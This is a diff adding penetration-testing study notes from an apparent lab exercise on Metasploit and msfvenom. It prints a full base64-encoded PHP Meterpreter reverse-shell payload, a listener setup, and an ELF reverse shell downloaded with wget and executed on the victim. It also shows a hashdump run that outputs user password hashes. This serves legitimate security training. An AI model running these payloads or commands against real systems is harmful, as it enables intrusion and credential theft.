@@ -881,6 +881,7 @@ You may want to look for low-hanging fruits such as:
 
 
 ### EXPLOITATION 
+In this section we're going to have a chance to try the eternal blue vulnerability 
 
 run nmap first 
 ```
@@ -1001,6 +1002,173 @@ Host script results:
 
 next msfconsole. the target is running a windows. 
 we could try to use the eternal blue vulnerability 
+
+
+### MSFVENOM PAYLOAD
+Msfvenom, which replaced Msfpayload and Msfencode, allows you to generate payloads.
+
+Msfvenom will allow you to access all payloads available in the  Metasploit framework. Msfvenom allows you to create payloads in many different formats (PHP, exe, dll, elf, etc.) and for many different target systems (Apple, Windows, Android, Linux, etc.).
+
+```
+msfvenom -l payloads
+
+Framework Payloads (562 total) [--payload ]
+...
+```
+
+**Output formats**
+
+You can either generate stand-alone payloads (e.g. a Windows executable for Meterpreter) or get a usable raw format (e.g. python). The `msfvenom --list` formats command can be used to list supported output formats
+
+**Encoders** 
+Contrary to some beliefs, encoders do not aim to bypass antivirus installed on the target system. As the name suggests, they encode the payload. While it can be effective against some antivirus software, using modern obfuscation techniques or learning methods to inject shellcode is a better solution to the problem. The example below shows the usage of encoding (with the `-e` parameter. The PHP version of Meterpreter was encoded in Base64, and the output format was raw.
+
+```
+root@ip-10-10-186-44:~# msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64
+[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
+[-] No arch selected, selecting arch: php from the payload
+Found 1 compatible encoders
+Attempting to encode payload with 1 iterations of php/base64
+php/base64 succeeded with size 1507 (iteration=0)
+php/base64 chosen with final size 1507
+Payload size: 1507 bytes
+eval(base64_decode(Lyo8P3BocCAvKiovIGVycm9yX3JlcG9ydGluZygwKTsgJGlwID0gJzEwLjEwLjE4Ni40NCc7ICRwb3J0ID0gNDQ0NDsgaWYgKCgkZiA9ICdzdHJlYW1fc29ja2V0X2NsaWVudCcpICYmIGlzX2NhbGxhYmxlKCRmKSkgeyAkcyA9ICRmKCJ0Y3A6Ly97JGlwfTp7JHBvcnR9Iik7ICRzX3R5cGUgPSAnc3RyZWFtJzsgfSBpZiAoISRzICYmICgkZiA9ICdmc29ja29wZW4nKSAmJiBpc19jYWxsYWJsZSgkZikpIHsgJHMgPSAkZigkaXAsICRwb3J0KTsgJHNfdHlwZSA9ICdzdHJlYW0nOyB9IGlmICghJHMgJiYgKCRmID0gJ3NvY2tldF9jcmVhdGUnKSAmJiBpc19jYWxsYWJsZSgkZikpIHsgJHMgPSAkZihBRl9JTkVULCBTT0NLX1NUUkVBTSwgU09MX1RDUCk7ICRyZXMgPSBAc29ja2V0X2Nvbm5lY3QoJHMsICRpcCwgJHBvcnQpOyBpZiAoISRyZXMpIHsgZGllKCk7IH0gJHNfdHlwZSA9ICdzb2NrZXQnOyB9IGlmICghJHNfdHlwZSkgeyBkaWUoJ25vIHNvY2tldCBmdW5jcycpOyB9IGlmICghJHMpIHsgZGllKCdubyBzb2NrZXQnKTsgfSBzd2l0Y2ggKCRzX3R5cGUpIHsgY2FzZSAnc3RyZWFtJzogJGxlbiA9IGZyZWFkKCRzLCA0KTsgYnJlYWs7IGNhc2UgJ3NvY2tldCc6ICRsZW4gPSBzb2NrZXRfcmVhZCgkcywgNCk7IGJyZWFrOyB9IGlmICghJGxlbikgeyBkaWUoKTsgfSAkYSA9IHVucGFjaygi.TmxlbiIsICRsZW4pOyAkbGVuID0gJGFbJ2xlbiddOyAkYiA9ICcnOyB3aGlsZSAoc3RybGVuKCRiKSA8ICRsZW4pIHsgc3dpdGNoICgkc190eXBlKSB7IGNhc2UgJ3N0cmVhbSc6ICRiIC49IGZyZWFkKCRzLCAkbGVuLXN0cmxlbigkYikpOyBicmVhazsgY2FzZSAnc29ja2V0JzogJGIgLj0gc29ja2V0X3JlYWQoJHMsICRsZW4tc3RybGVuKCRiKSk7IGJyZWFrOyB9IH0gJEdMT0JBTFNbJ21zZ3NvY2snXSA9ICRzOyAkR0xPQkFMU1snbXNnc29ja190eXBlJ10gPSAkc190eXBlOyBpZiAoZXh0ZW5zaW9uX2xvYWRlZCgnc3Vob3NpbicpICYmIGluaV9nZXQoJ3N1aG9zaW4uZXhlY3V0b3IuZGlzYWJsZV9ldmFsJykpIHsgJHN1aG9zaW5fYnlwYXNzPWNyZWF0ZV9mdW5jdGlvbignJywgJGIpOyAkc3Vob3Npbl9ieXBhc3MoKTsgfSBlbHNlIHsgZXZhbCgkYik7IH0gZGllKCk7));
+```
+
+
+Challenge
+```
+Listing all possible payloads
+msfvenom --list payloads > list.txt 
+
+Common Choices
+---
+generic/shell_reverse_tcp
+linux/aarch64/shell_reverse_tcp                                    Connect back to attacker and spawn a command shell
+linux/armle/shell_reverse_tcp                                      Connect back to attacker and spawn a command shell 
+linux/x86/shell_reverse_tcp                                        Connect back to attacker and spawn a command shell
+linux/x86/shell_reverse_tcp_ipv6                                   Connect back to attacker and spawn a command shell over IP
+windows/shell_reverse_tcp                                          Connect back to attacker and spawn a command shell 
+windows/x64/shell_reverse_tcp                                      Connect back to attacker and spawn a command shell (Windows x64)
+apple_ios/aarch64/shell_reverse_tcp                                Connect back to attacker and spawn a command 
+cmd/windows/powershell/shell_reverse_tcp                           Execute an x86 payload from a command via PowerShell. Connect back to attacker and spawn a command
+cmd/windows/powershell/x64/shell_reverse_tcp                       Execute an x64 payload from a command via PowerShell. Connect back to attacker and spawn a command shell (Windows x 
+java/shell_reverse_tcp                                             Connect back to attacker and spawn a command shell
+linux/x86/meterpreter/reverse_tcp 
+
+
+# FIRST run multi handler as listener 
+msfconsole
+msf6 > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp # THIS is the default
+
+# But we'll use this instead 
+msf6 exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp
+payload => linux/x86/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 10.10.245.243
+LHOST => 10.10.245.243
+msf6 exploit(multi/handler) > set LPORT 4444
+LPORT => 4444
+msf6 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 10.10.245.243:4444 
+
+# Start another terminal to generate a msfvenom payload 
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.245.243 LPORT=4444 -f elf > shell.elf
+```
+
+On the victim machine
+```
+root@ip-10-10-208-237:/# wget 10.10.245.243:8888/shell.elf
+--2022-11-23 01:14:36--  http://10.10.245.243:8888/shell.elf
+Connecting to 10.10.245.243:8888... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 207 [application/octet-stream]
+Saving to: ‘shell.elf’
+
+shell.elf              100%[=========================>]     207  --.-KB/s    in 0s
+
+2022-11-23 01:14:36 (12.6 MB/s) - ‘shell.elf’ saved [207/207]
+root@ip-10-10-208-237:/# chmod +x shell.elf
+root@ip-10-10-208-237:/# ./shell.elf  # enter
+```
+
+Going back to the attacker machine
+```
+...
+msf6 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 10.10.245.243:4444 
+# Returnin here
+[*] Sending stage (1017704 bytes) to 10.10.208.237
+[*] Meterpreter session 1 opened (10.10.245.243:4444 -> 10.10.208.237:48882) at 2022-11-23 01:16:35 +0000
+# Meterpreter just entered the system 
+meterpreter > sysinfo
+Computer     : ip-10-10-208-237.eu-west-1.compute.internal
+OS           : Ubuntu 18.04 (Linux 5.4.0-1029-aws)
+Architecture : x64
+BuildTuple   : i486-linux-musl
+Meterpreter  : x86/linux
+meterpreter >
+
+# NOW we have to rerun it again and use -z option, so it would be saved in the background session 
+# QUESTIONS how to exit meterpreter without removing session ? 
+# for the mean time let's continue in the task 
+# The goal is to get the hashpasswords of the users.
+# simple idea would just get /etc/passwd but using msfconsole feels good too
+
+
+msfconsole
+msf6 > use post/linux/gather/hashdump
+msf6 post(linux/gather/hashdump) > info
+
+       Name: Linux Gather Dump Password Hashes for Linux Systems
+     Module: post/linux/gather/hashdump
+   Platform: Linux
+       Arch: 
+       Rank: Normal
+
+Provided by:
+  Carlos Perez <carlos_perez@darkoperator.com>
+
+Compatible session types:
+  Meterpreter
+  Shell
+
+Basic options:
+  Name     Current Setting  Required  Description
+  ----     ---------------  --------  -----------
+  SESSION                   yes       The session to run this module on
+
+Description:
+  Post Module to dump the password hashes for all users on a Linux 
+  System
+
+msf6 exploit(multi/handler) > use post/linux/gather/hashdump
+msf6 post(linux/gather/hashdump) > set session 2
+session => 2
+msf6 post(linux/gather/hashdump) > run
+
+[+] murphy:$6$qK0Kt4UO$HuCrlOJGbBJb5Av9SL7rEzbxcz/KZYFkMwUqAE0ZMDpNRmOHhPHeI2JU3m9OBOS7lUKkKMADLxCBcywzIxl7b.:1001:1001::/home/murphy:/bin/sh
+[+] claire:$6$Sy0NNIXw$SJ27WltHI89hwM5UxqVGiXidj94QFRm2Ynp9p9kxgVbjrmtMez9EqXoDWtcQd8rf0tjc77hBFbWxjGmQCTbep0:1002:1002::/home/claire:/bin/sh
+[+] Unshadowed Password File: /root/.msf4/loot/20221123012513_default_10.10.208.237_linux.hashes_866296.txt
+[*] Post module execution completed
+
+
+```
+
+
+### SUMMARY 
+You should now have a better understanding of how Metasploit can help you identify potential vulnerabilities on target systems and exploit these vulnerabilities.
+
+
+You have also seen how the database feature can help you with penetration testing engagements where you have multiple potential targets.
+Finally, you should have gained some experience with msfvenom and the creation of stand-alone Meterpreter payloads. This is especially helpful in situations where you can upload a file to the target system or have the ability to download files to the target system. Meterpreter is a powerful tool that offers a lot of easy to use features during the post-exploitation phase. 
+
+
+
+
+
 
 
 
